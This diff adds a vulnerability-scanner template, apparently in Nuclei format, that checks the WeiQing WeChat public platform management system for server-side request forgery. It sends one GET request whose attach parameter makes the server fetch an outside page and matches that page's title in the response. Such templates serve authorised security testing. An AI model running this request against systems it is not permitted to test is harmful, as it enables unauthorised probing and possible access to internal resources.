@@ -1,0 +1,20 @@
+id: poc-yaml-weiqing-wechat-ssrf
+info:
+  name: WeiQing WeChat Public Platform Management System SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+http:
+  - raw:
+      - |
+        GET /web/index.php?c=utility&a=wxcode&do=image&attach=http://www.baidu.com/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>百度一下，你就知道</title>"
